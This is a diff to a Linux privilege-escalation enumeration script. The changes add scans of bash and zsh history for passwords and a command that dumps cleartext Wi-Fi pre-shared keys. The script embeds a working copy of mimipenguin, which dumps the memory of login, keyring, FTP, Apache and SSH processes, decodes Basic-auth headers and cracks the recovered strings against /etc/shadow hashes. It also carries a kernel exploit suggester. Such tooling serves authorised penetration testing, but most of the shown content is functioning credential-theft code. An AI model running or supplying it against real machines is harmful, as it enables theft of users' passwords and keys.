@@ -223,6 +223,25 @@ echo -e "\n"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Password file:${XX}"
     ls -la /etc/passwd --color=always
+echo -e "\n${BLUE}╔═════{ Password in history files:${XX}"
+echo -e "\n${BLUE}    ══{ .bash_history${XX}"
+    if [ -f ~/.bash_history ]; 
+        then
+            cat ~/.bash_history | grep "pass" 2>/dev/null
+        else
+            echo -e "  ${RED}File does not exist${XX}"
+    fi
+echo -e "\n${BLUE}    ══{ .zsh_history${XX}"
+    if [ -f ~/.zsh_history ]; 
+        then
+            cat ~/.zsh_history | grep "pass" 2>/dev/null
+        else
+            echo -e "  ${RED}File does not exist${XX}"
+    fi
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║The bash_history file is used to store the command history of a particular user. The bash_history file can be       ║"
+        echo -e "\t║configured in the .bashrc configuration file that is stored in the home directory of a user.                        ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}    ══{ Is Password file Writable?${XX}"
     passwd=/etc/passwd
     [ $# -eq 0 ]
@@ -360,19 +379,31 @@ echo -e "\n"
         echo -e "\t║${RED}grep -rn -i 'pass\|cred\|hash' / --color=always > password.txt${XX}                                                      ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Find 'Pass, Hash, Cred' as a file name:${XX}"
-    find / -iname "*pass*" -o -iname "*hash*" -o -iname "*cred*" 2> /dev/null | xargs ls -ld 2> /dev/null --color=always | grep -v "/usr/\|/var/\|/opt/\|/sys/"
+    find / -iname "*pass*" -o -iname "*hash*" -o -iname "*cred*" 2>/dev/null | xargs ls -ld 2>/dev/null --color=always | grep -v "/usr/\|/var/\|/opt/\|/sys/"
         echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e  "\t║Excluded: /usr/ | /var/ | /opt/ | /sys/                                                                             ║"
         echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Bash History Files:${XX}"
     find / -iname *_history -xdev 2>/dev/null | xargs ls -ld
 echo -e "\n${BLUE}╔═════{ Curent User Bash History:${XX}"
+echo -e "\n${BLUE}    ══{ .bash_history:${XX}"
         if [ -f /home/$USER/.bash_history ]; 
             then
                 echo -e "\n${BLUE}    ══{ Reading last 100 User Bash History:${XX}"
-                tail -n 100 /home/$USER/.bash_history
+                tail -n 100 /home/$USER/.bash_history 2>/dev/null
                     echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-                    echo -e  "\t║If you want to read the whole file do: cat /home/$USER/.bash_history                                                ║"
+                    echo -e  "\t║If you want to read the whole file do: cat ~/.bash_history                                                          ║"
+                    echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+            else
+                echo -e "${RED}	File does not exist${XX}"
+        fi
+echo -e "\n${BLUE}    ══{ .zsh_history:${XX}"
+        if [ -f /home/$USER/.zsh_history ]; 
+            then
+                echo -e "\n${BLUE}    ══{ Reading last 100 User Bash History:${XX}"
+                tail -n 100 /home/$USER/.zsh_history 2>/dev/null
+                    echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+                    echo -e  "\t║If you want to read the whole file do: cat ~/.zsh_history                                                           ║"
                     echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
             else
                 echo -e "${RED}	File does not exist${XX}"
@@ -444,6 +475,8 @@ echo -e "\n${BLUE}╔═════{ WiFi Creds:${XX}"
         echo -e "\t║There is a file for each connection with its configuration, also you need root privileges to read. However, the     ║"
         echo -e "\t║password isn't encrypted.                                                                                           ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}╔═════{ Dump cleartext Pre-Shared Wireless Keys:${XX}"
+    cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"
 echo -e "\n${BLUE}╔═════{ Sensitive files:${XX}"
     ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
@@ -474,11 +507,9 @@ echo -e "\n${BLUE}╔═════{ Firefox credentials:${XX}"
     fi
 echo -e "\n${BLUE}╔═════{ Passwords in smb.conf file:${XX}"
     cat /etc/samba/smb.conf 2>/dev/null | grep -i 'pass\|cred\|hash' --color=always 2>/dev/null
-echo -e "\n${BLUE}╔═════{ Dump cleartext Pre-Shared Wireless Keys:${XX}"
-    cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"
 echo -e "\n${BLUE}╔═════{ Find config.* files 'Excluded /var/ | /usr/':${XX}"
-    find / -iname config.* 2> /dev/null | grep -v '/var/\|/usr/' | xargs ls -ld 2>/dev/null
-echo -e "\n${BLUE}╔═════{ Any credentials in apache2.conf file:${XX}"
+    find / -iname config.* 2>/dev/null | grep -v '/var/\|/usr/' | xargs ls -ld 2>/dev/null
+echo -e "\n${BLUE}╔═════{ Apache2 credentials:${XX}"
     if [ -f /etc/apache2/apache2.conf ];
         then
         echo -e "\n${BLUE}    ══{ apache2.conf file permission:${XX}"
@@ -494,53 +525,57 @@ fi
 echo -e "\n${BLUE}╔═════{ Configuration files that might contain sensitive information:${XX}"
     grep "pass\|cred\|hash" /etc/*.conf 2>/dev/null --color=always
 echo -e "\n${BLUE}╔═════{ Cleartext Credentials in Memory:${XX}"
-echo -e "${BLUE}    ══{ Supported by mimipenguin:${XX}"
-echo -e "${BLUE}    ══{ Download from: https://github.com/huntergregal/mimipenguin ${XX}"
+echo -e "${BLUE}    ══{ Thanks to mimipenguin:${XX}"
+echo -e "${BLUE}    ══{ Download: https://github.com/huntergregal/mimipenguin ${XX}"
     root () { [ "$(id -u)" -eq 0 ]; }
     if root;
         then
         echo -e "${GREEN}        On Progress ....${XX}"
-            #Store results to cleanup later
             export RESULTS=""
-            # check if a command exists in $PATH
             command_exists () {
             command -v "${1}" >/dev/null 2>&1
             }
-            # check for required executables in $PATH
-            if ! command_exists strings; then
+            if ! command_exists strings; 
+            then
                 echo "Error: command 'strings' not found in ${PATH}"
                 exit 1
             fi
-            if ! command_exists grep; then
+            if ! command_exists grep; 
+            then
                 echo "Error: command 'grep' not found in ${PATH}"
                 exit 1
             fi
-            # Check for any of the currently tested versions of Python
-            if command_exists python2; then
+            if command_exists python2; 
+            then
                 pycmd=python2
-            elif command_exists python2.7; then
+            elif command_exists python2.7; 
+            then
                 pycmd=python2.7
-            elif command_exists python3; then
+            elif command_exists python3; 
+            then
                 pycmd=python3
-            elif command_exists python3.6; then
+            elif command_exists python3.6; 
+            then
                 pycmd=python3.6
-            elif command_exists python3.7; then
+            elif command_exists python3.7; 
+            then
                 pycmd=python3.7
             else
                 echo "Error: No supported version of 'python' found in ${PATH}"
                 exit 1
             fi
-            # $1 = PID, $2 = output_file, $3 = operating system
             function dump_pid () {
                 system=$3
                 pid=$1
                 output_file=$2
-                if [[ $system == "kali" ]]; then
+                if [[ $system == "kali" ]]; 
+                then
                     mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | grep -E 'heap|stack' | cut -d' ' -f 1)
                 else
                     mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | cut -d' ' -f 1)
                 fi
-                while read -r memrange; do
+                while read -r memrange; 
+                do
                     memrange_start=$(echo "$memrange" | cut -d"-" -f 1)
                     memrange_start=$(printf "%u\n" 0x"$memrange_start")
                     memrange_stop=$(echo "$memrange" | cut -d"-" -f 2)
@@ -550,41 +585,37 @@ echo -e "${BLUE}    ══{ Download from: https://github.com/huntergregal/mimip
                         skip="$memrange_start" count="$memrange_size" > /dev/null 2>&1
                 done <<< "$mem_maps"
             }
-            # $1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
             function parse_pass () {
-                #If hash not in dump get shadow hashes
-                if [[ ! "$2" ]]; then
+                if [[ ! "$2" ]]; 
+                then
                         SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | grep -E '^\$.\$')"
                 fi
-                #Determine password potential for each word
-                while read -r line; do
-                    #If hash in dump, prepare crypt line
-                    if [[ "$2" ]]; then
-                        #get ctype
+                while read -r line; 
+                do
+                    if [[ "$2" ]]; 
+                    then
                         CTYPE="$(echo "$2" | cut -c-3)"
-                        #Escape quotes, backslashes, single quotes to pass into crypt
                         SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
                         CRYPT="\"$SAFE\", \"$CTYPE$3\""
-                        if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))") == "$2" ]]; then
-                            #Find which user's password it is (useful if used more than once!)
+                        if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))") == "$2" ]]; 
+                        then
                             USER="$(grep "${2}" /etc/shadow | cut -d':' -f 1)"
                             export RESULTS="$RESULTS$4          $USER:$line \n"
                         fi
-                    #Else use shadow hashes
-                    elif [[ $SHADOWHASHES ]]; then
-                        while read -r thishash; do
+                    elif [[ $SHADOWHASHES ]]; 
+                    then
+                        while read -r thishash; 
+                        do
                             CTYPE="$(echo "$thishash" | cut -c-3)"
                             SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
-                            #Escape quotes, backslashes, single quotes to pass into crypt
                             SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
                             CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
-                            if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))") == "$thishash" ]]; then
-                                #Find which user's password it is (useful if used more than once!)
+                            if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))") == "$thishash" ]]; 
+                            then
                                 USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
                                 export RESULTS="$RESULTS$4          $USER:$line\n"
                             fi
                         done <<< "$SHADOWHASHES"
-                    #if no hash data - revert to checking probability
                     else
                     patterns=("^_pammodutil.+[0-9]$"\
                             "^LOGNAME="\
@@ -600,143 +631,130 @@ echo -e "${BLUE}    ══{ Download from: https://github.com/huntergregal/mimip
                             "(aoao)"\
                             "stuv")
                     export RESULTS="$RESULTS[HIGH]$4            $line\n"
-                    for pattern in "${patterns[@]}"; do
-                    if [[ $line =~ $pattern ]]; then
+                    for pattern in "${patterns[@]}"; 
+                    do
+                    if [[ $line =~ $pattern ]]; 
+                    then
                         export RESULTS="$RESULTS[LOW]$4         $line\n"
                     fi
                     done
                     fi
                 done <<< "$1"
-            } # end parse_pass
-            #Support Kali
-            if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
+            }
+            if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; 
+            then
                 SOURCE="[SYSTEM - GNOME]"
-                #get gdm-session-worker [pam/gdm-password] process
                 PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk -F ' ' '{ print $1 }')"
-                #if exists aka someone logged into gnome then extract...
-                if [[ $PID ]];then
-                    while read -r pid; do
+                if [[ $PID ]];
+                then
+                    while read -r pid; 
+                    do
                         dump_pid "$pid" /tmp/dump "kali"
                         HASH="$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
                         SALT="$(echo "$HASH" | cut -d'$' -f 3)"
                         DUMP="$(strings "/tmp/dump.${pid}" | grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
                         DUMP="${DUMP}$(strings "/tmp/dump.${pid}" | grep -E '^gkr_system_authtok$' -B 5 -A 5)"
-                        #Remove dupes to speed up processing
                         DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                         parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
-                
-                        #cleanup
                         rm -rf "/tmp/dump.${pid}"
                     done <<< "$PID"
                 fi
             fi
-            #Support gnome-keyring
-            if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then
+            if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; 
+            then
                     SOURCE="[SYSTEM - GNOME]"
-                    #get /usr/bin/gnome-keyring-daemon process
                     PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk -F ' ' '{ print $1 }')"
-                #if exists aka someone logged into gnome then extract...
-                if [[ $PID ]];then
-                    while read -r pid; do
+                if [[ $PID ]];
+                then
+                    while read -r pid; 
+                    do
                         dump_pid "$pid" /tmp/dump
                         HASH="$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
                         SALT="$(echo "$HASH" | cut -d'$' -f 3)"
                         DUMP=$(strings "/tmp/dump.${pid}" | grep -E '^.+libgck\-1\.so\.0$' -B 10 -A 10)
                         DUMP+=$(strings "/tmp/dump.${pid}" | grep -E -A 5 -B 5 'libgcrypt\.so\..+$')
-                        #Remove dupes to speed up processing
                         DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                         parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
-                        #cleanup
                         rm -rf "/tmp/dump.${pid}"
                     done <<< "$PID"
                 fi
             fi
-            #Support LightDM
-            if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep lightdm | grep session-child) ]]; then
+            if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep lightdm | grep session-child) ]]; 
+            then
                 SOURCE="[SYSTEM - LIGHTDM]"
                 PID="$(ps -eo pid,command | grep lightdm | sed -rn '/session\-child/p' | awk -F ' ' '{ print $1 }')"
-                #if exists aka someone logged into lightdm then extract...
-                if [[ $PID ]]; then
-                    while read -r pid; do
+                if [[ $PID ]]; 
+                then
+                    while read -r pid; 
+                    do
                         dump_pid "$pid" /tmp/dump
                         HASH=$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')
                         SALT="$(echo "$HASH" | cut -d'$' -f 3)"
                         DUMP="$(strings "/tmp/dump.${pid}" | grep -E '^_pammodutil_getspnam_' -A1)"
-                        #Remove dupes to speed up processing
                         DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                         parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
-                        #cleanup
                         rm -rf "/tmp/dump.${pid}"
                     done <<< "$PID"
                 fi
             fi
-            #Support VSFTPd - Active Users
-            if [[ -e "/etc/vsftpd.conf" ]]; then
+            if [[ -e "/etc/vsftpd.conf" ]]; 
+            then
                     SOURCE="[SYSTEM - VSFTPD]"
-                    #get nobody /usr/sbin/vsftpd /etc/vsftpd.conf
                     PID="$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk -F ' ' '{ print $1 }')"
-                #if exists aka someone logged into FTP then extract...
-                if [[ $PID ]];then
-                    while read -r pid; do
+                if [[ $PID ]];
+                then
+                    while read -r pid; 
+                    do
                         dump_pid "$pid" /tmp/vsftpd
                         HASH="$(strings "/tmp/vsftpd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
                         SALT="$(echo "$HASH" | cut -d'$' -f 3)"
                         DUMP=$(strings "/tmp/vsftpd.${pid}" | grep -E -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
-                        #Remove dupes to speed up processing
                         DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                         parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
                     done <<< "$PID"
-                    #cleanup
                     rm -rf /tmp/vsftpd*
                 fi
             fi
-            #Support Apache2 - HTTP BASIC AUTH
-            if [[ -e "/etc/apache2/apache2.conf" ]]; then
+            if [[ -e "/etc/apache2/apache2.conf" ]]; 
+            then
                     SOURCE="[HTTP BASIC - APACHE2]"
-                    #get all apache workers /usr/sbin/apache2 -k start
                     PID="$(ps -eo pid,user,command | grep apache2 | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
-                #if exists aka apache2 running
-                if [[ "$PID" ]];then
-                    #Dump all workers
-                    while read -r pid; do
+                if [[ "$PID" ]];
+                then
+                    while read -r pid; 
+                    do
                         gcore -o /tmp/apache "$pid" > /dev/null 2>&1
-                        #without gcore - VERY SLOW!
-                        #dump_pid $pid /tmp/apache
                     done <<< "$PID"
-                    #Get encoded creds
                     DUMP="$(strings /tmp/apache* | grep -E '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
-                    #for each extracted b64 - decode the cleartext
-                    while read -r encoded; do
+                    while read -r encoded; 
+                    do
                         CREDS="$(echo "$encoded" | base64 -d)"
-                        if [[ "$CREDS" ]]; then
+                        if [[ "$CREDS" ]]; 
+                        then
                             export RESULTS="$RESULTS$SOURCE         $CREDS\n"
                         fi
                     done <<< "$DUMP"
-                    #cleanup
                     rm -rf /tmp/apache*
                 fi
             fi
-            #Support sshd - Search active connections for Sudo passwords
-            if [[ -e "/etc/ssh/sshd_config" ]]; then
+            if [[ -e "/etc/ssh/sshd_config" ]]; 
+            then
                 SOURCE="[SYSTEM - SSH]"
-                #get all ssh tty/pts sessions - sshd: user@pts01
                 PID="$(ps -eo pid,command | grep -E 'sshd:.+@' | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
-                #if exists aka someone logged into SSH then dump
-                if [[ "$PID" ]];then
-                    while read -r pid; do
+                if [[ "$PID" ]];
+                then
+                    while read -r pid; 
+                    do
                         dump_pid "$pid" /tmp/sshd
                         HASH="$(strings "/tmp/sshd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
                         SALT="$(echo "$HASH" | cut -d'$' -f 3)"
                         DUMP=$(strings "/tmp/sshd.${pid}" | grep -E -A 3 '^sudo.+')
-                        #Remove dupes to speed up processing
                         DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                         parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
                     done <<< "$PID"
-                    #cleanup
                     rm -rf /tmp/sshd.*
                 fi
             fi
-            #Output results to STDOUT
             printf "        MimiPenguin Results:\n"
             printf "%b" "$RESULTS" | sort -u
             unset RESULTS
@@ -748,7 +766,7 @@ echo -e "${RED} \t\t╔═══════════════════
 echo -e "${RED} \t\t ═════════════════════════════════════════[ System Information ]═════════════════════════════════════════ ${XX}"
 echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
 echo -e "\n"
-echo -e "\n${BLUE}╔═════{ System Name:${XX}"
+echo -e "\n${BLUE}╔═════{ kernel version & operating system architecture:${XX}"
     uname -a 2>/dev/null
 echo -e "\n${BLUE}╔═════{ Kernal Exploit:${XX}"
 echo -e "${BLUE}    ══{ Supported by linux-exploit-suggester:${XX}"
@@ -781,8 +799,6 @@ echo -e "${BLUE}    ══{ Download from: https://github.com/mzet-/linux-exploi
     declare -a EXPLOITS
     declare -a EXPLOITS_USERSPACE
     declare -a exploits_to_sort
-    declare -a SORTED_EXPLOITS
-############ LINUX KERNELSPACE EXPLOITS ####################
 n=0
 EXPLOITS[((n++))]=$(cat <<EOF
 Name: ${GREEN}   ══{ CVE-2004-1235 } ${XX} elflbl
@@ -1645,7 +1661,6 @@ author: theflow (orginal exploit author); bcoles (author of exploit update at 'e
 EOF
 )
 
-############ USERSPACE EXPLOITS ###########################
 n=0
 
 EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
@@ -2205,7 +2220,6 @@ exploit-db: https://www.exploit-db.com/exploits/41154
 EOF
 )
 
-## security related HW/kernel features
 n=0
 
 FEATURES[((n++))]=$(cat <<EOF
@@ -2489,8 +2503,6 @@ available: CONFIG_DEVKMEM=y
 analysis-url: https://github.com/mzet-/les-res/blob/master/features/devkmem.md
 EOF
 )
-## linux-exploit-suggester
-    # extracts all information from output of 'uname -a' command
     parseUname() {
         local uname=$1
         KERNEL=$(echo "$uname" | awk '{print $3}' | cut -d '-' -f 1)
@@ -2505,54 +2517,52 @@ EOF
         echo "$uname" | grep -q -i '\.fc' && OS="fedora"
         echo "$uname" | grep -q -i '\.el' && OS="RHEL"
         echo "$uname" | grep -q -i '\.mga' && OS="mageia"
-
-        # 'uname -a' output doesn't contain distribution number (at least not in case of all distros)
     }
     getPkgList() {
         local distro=$1
         local pkglist_file=$2
-        # take package listing from provided file & detect if it's 'rpm -qa' listing or 'dpkg -l' or 'pacman -Q' listing of not recognized listing
-        if [ "$opt_pkglist_file" = "true" -a -e "$pkglist_file" ]; then
-            # ubuntu/debian package listing file
-            if [ $(head -1 "$pkglist_file" | grep 'Desired=Unknown/Install/Remove/Purge/Hold') ]; then
+        if [ "$opt_pkglist_file" = "true" -a -e "$pkglist_file" ]; 
+        then
+            if [ $(head -1 "$pkglist_file" | grep 'Desired=Unknown/Install/Remove/Purge/Hold') ]; 
+            then
                 PKG_LIST=$(cat "$pkglist_file" | awk '{print $2"-"$3}' | sed 's/:amd64//g')
-
                 OS="debian"
                 [ "$(grep ubuntu "$pkglist_file")" ] && OS="ubuntu"
-            # redhat package listing file
-            elif [ "$(grep -E '\.el[1-9]+[\._]' "$pkglist_file" | head -1)" ]; then
+            elif [ "$(grep -E '\.el[1-9]+[\._]' "$pkglist_file" | head -1)" ]; 
+            then
                 PKG_LIST=$(cat "$pkglist_file")
                 OS="RHEL"
-            # fedora package listing file
-            elif [ "$(grep -E '\.fc[1-9]+'i "$pkglist_file" | head -1)" ]; then
+            elif [ "$(grep -E '\.fc[1-9]+'i "$pkglist_file" | head -1)" ]; 
+            then
                 PKG_LIST=$(cat "$pkglist_file")
                 OS="fedora"
-            # mageia package listing file
-            elif [ "$(grep -E '\.mga[1-9]+' "$pkglist_file" | head -1)" ]; then
+            elif [ "$(grep -E '\.mga[1-9]+' "$pkglist_file" | head -1)" ]; 
+            then
                 PKG_LIST=$(cat "$pkglist_file")
                 OS="mageia"
-            # pacman package listing file
-            elif [ "$(grep -E '\ [0-9]+\.' "$pkglist_file" | head -1)" ]; then
+            elif [ "$(grep -E '\ [0-9]+\.' "$pkglist_file" | head -1)" ]; 
+            then
                 PKG_LIST=$(cat "$pkglist_file" | awk '{print $1"-"$2}')
                 OS="arch"
-            # file not recognized - skipping
             else
                 PKG_LIST=""
             fi
-        elif [ "$distro" = "debian" -o "$distro" = "ubuntu" -o "$distro" = "deepin" ]; then
+        elif [ "$distro" = "debian" -o "$distro" = "ubuntu" -o "$distro" = "deepin" ]; 
+        then
             PKG_LIST=$(dpkg -l | awk '{print $2"-"$3}' | sed 's/:amd64//g')
-        elif [ "$distro" = "RHEL" -o "$distro" = "fedora" -o "$distro" = "mageia" ]; then
+        elif [ "$distro" = "RHEL" -o "$distro" = "fedora" -o "$distro" = "mageia" ];
+        then
             PKG_LIST=$(rpm -qa)
-        elif [ "$distro" = "arch" -o "$distro" = "manjaro" ]; then
+        elif [ "$distro" = "arch" -o "$distro" = "manjaro" ]; 
+        then
             PKG_LIST=$(pacman -Q | awk '{print $1"-"$2}')
-        elif [ -x /usr/bin/equery ]; then
+        elif [ -x /usr/bin/equery ]; 
+        then
             PKG_LIST=$(/usr/bin/equery --quiet list '*' -F '$name:$version' | cut -d/ -f2- | awk '{print $1":"$2}')
         else
-            # packages listing not available
             PKG_LIST=""
         fi
     }
-    # from: https://stackoverflow.com/questions/4023830/how-compare-two-strings-in-dot-separated-version-format-in-bash
     verComparision() {
         if [[ $1 == $2 ]]
         then
@@ -2560,8 +2570,6 @@ EOF
         fi
         local IFS=.
         local i ver1=($1) ver2=($2)
-
-        # fill empty fields in ver1 with zeros
         for ((i=${#ver1[@]}; i<${#ver2[@]}; i++))
         do
             ver1[i]=0
@@ -2570,7 +2578,6 @@ EOF
         do
             if [[ -z ${ver2[i]} ]]
             then
-                # fill empty fields in ver2 with zeros
                 ver2[i]=0
             fi
             if ((10#${ver1[i]} > 10#${ver2[i]}))
@@ -2620,96 +2627,90 @@ EOF
         return 1
     }
     checkRequirement() {
-        #echo "Checking requirement: $1"
         local IN="$1"
         local pkgName="${2:4}"
-        if [[ "$IN" =~ ^pkg=.*$ ]]; then
-            # always true for Linux OS
+        if [[ "$IN" =~ ^pkg=.*$ ]]; 
+        then
             [ ${pkgName} == "linux-kernel" ] && return 0
-            # verify if package is present 
             pkg=$(echo "$PKG_LIST" | grep -E -i "^$pkgName-[0-9]+" | head -1)
-            if [ -n "$pkg" ]; then
+            if [ -n "$pkg" ]; 
+            then
                 return 0
             fi
-        elif [[ "$IN" =~ ^ver.*$ ]]; then
+        elif [[ "$IN" =~ ^ver.*$ ]]; 
+        then
             version="${IN//[^0-9.]/}"
             rest="${IN#ver}"
             operator=${rest%$version}
-            if [ "$pkgName" == "linux-kernel" -o "$opt_checksec_mode" == "true" ]; then
-                # for --cvelist-file mode skip kernel version comparision
+            if [ "$pkgName" == "linux-kernel" -o "$opt_checksec_mode" == "true" ]; 
+            then
                 [ "$opt_cvelist_file" = "true" ] && return 0
                 doVersionComparision $version $operator $KERNEL && return 0
             else
-                # extract package version and check if requiremnt is true
                 pkg=$(echo "$PKG_LIST" | grep -E -i "^$pkgName-[0-9]+" | head -1)
-                # skip (if run with --skip-pkg-versions) version checking if package with given name is installed
                 [ "$opt_skip_pkg_versions" = "true" -a -n "$pkg" ] && return 0
-                # versioning:
-                #echo "pkg: $pkg"
                 pkgVersion=$(echo "$pkg" | grep -E -i -o -e '-[\.0-9\+:p]+[-\+]' | cut -d':' -f2 | sed 's/[\+-]//g' | sed 's/p[0-9]//g')
-                #echo "version: $pkgVersion"
-                #echo "operator: $operator"
-                #echo "required version: $version"
-                #echo
                 doVersionComparision $version $operator $pkgVersion && return 0
             fi
-        elif [[ "$IN" =~ ^x86_64$ ]] && [ "$ARCH" == "x86_64" -o "$ARCH" == "" ]; then
+        elif [[ "$IN" =~ ^x86_64$ ]] && [ "$ARCH" == "x86_64" -o "$ARCH" == "" ]; 
+        then
             return 0
-        elif [[ "$IN" =~ ^x86$ ]] && [ "$ARCH" == "i386" -o "$ARCH" == "i686" -o "$ARCH" == "" ]; then
+        elif [[ "$IN" =~ ^x86$ ]] && [ "$ARCH" == "i386" -o "$ARCH" == "i686" -o "$ARCH" == "" ]; 
+        then
             return 0
-        elif [[ "$IN" =~ ^CONFIG_.*$ ]]; then
-            # skip if check is not applicable (-k or --uname or -p set) or if user said so (--skip-more-checks)
+        elif [[ "$IN" =~ ^CONFIG_.*$ ]]; 
+        then
             [ "$opt_skip_more_checks" = "true" ] && return 0
-            # if kernel config IS available:
-            if [ -n "$KCONFIG" ]; then
-                if $KCONFIG | grep -E -qi $IN; then
+            if [ -n "$KCONFIG" ]; 
+            then
+                if $KCONFIG | grep -E -qi $IN; 
+                then
                     return 0;
-                # required option wasn't found, exploit is not applicable
                 else
                     return 1;
                 fi
-            # config is not available
             else
                 return 0;
             fi
-        elif [[ "$IN" =~ ^sysctl:.*$ ]]; then
-            # skip if check is not applicable (-k or --uname or -p modes) or if user said so (--skip-more-checks)
+        elif [[ "$IN" =~ ^sysctl:.*$ ]]; 
+        then
             [ "$opt_skip_more_checks" = "true" ] && return 0
             sysctlCondition="${IN:7}"
-            # extract sysctl entry, relation sign and required value
-            if echo $sysctlCondition | grep -qi "!="; then
+            if echo $sysctlCondition | grep -qi "!="; 
+            then
                 sign="!="
-            elif echo $sysctlCondition | grep -qi "=="; then
+            elif echo $sysctlCondition | grep -qi "=="; 
+            then
                 sign="=="
             else
                 exitWithErrMsg "Wrong sysctl condition. There is syntax error in your features DB. Aborting."
             fi
             val=$(echo "$sysctlCondition" | awk -F "$sign" '{print $2}')
             entry=$(echo "$sysctlCondition" | awk -F "$sign" '{print $1}')
-            # get current setting of sysctl entry
-            curVal=$(/sbin/sysctl -a 2> /dev/null | grep "$entry" | awk -F'=' '{print $2}')
-            # special case for --checksec mode: return 2 if there is no such switch in sysctl
+            curVal=$(/sbin/sysctl -a 2>/dev/null | grep "$entry" | awk -F'=' '{print $2}')
             [ -z "$curVal" -a "$opt_checksec_mode" = "true" ] && return 2
-            # for other modes: skip if there is no such switch in sysctl
             [ -z "$curVal" ] && return 0
-            # compare & return result
             compareValues $curVal $val $sign && return 0
-        elif [[ "$IN" =~ ^cmd:.*$ ]]; then
-            # skip if check is not applicable (-k or --uname or -p modes) or if user said so (--skip-more-checks)
+        elif [[ "$IN" =~ ^cmd:.*$ ]]; 
+        then
             [ "$opt_skip_more_checks" = "true" ] && return 0
             cmd="${IN:4}"
-            if eval "${cmd}"; then
+            if eval "${cmd}"; 
+            then
                 return 0
             fi
         fi
         return 1
     }
     getKernelConfig() {
-        if [ -f /proc/config.gz ] ; then
+        if [ -f /proc/config.gz ] ; 
+        then
             KCONFIG="zcat /proc/config.gz"
-        elif [ -f /boot/config-`uname -r` ] ; then
+        elif [ -f /boot/config-`uname -r` ] ; 
+        then
             KCONFIG="cat /boot/config-`uname -r`"
-        elif [ -f "${KBUILD_OUTPUT:-/usr/src/linux}"/.config ] ; then
+        elif [ -f "${KBUILD_OUTPUT:-/usr/src/linux}"/.config ] ; 
+        then
             KCONFIG="cat ${KBUILD_OUTPUT:-/usr/src/linux}/.config"
         else
             KCONFIG=""
@@ -2717,22 +2718,19 @@ EOF
     }
     checksecMode() {
         MODE=0
-        # start analysis
-    for FEATURE in "${FEATURES[@]}"; do
-        # create array from current exploit here doc and fetch needed lines
+    for FEATURE in "${FEATURES[@]}"; 
+    do
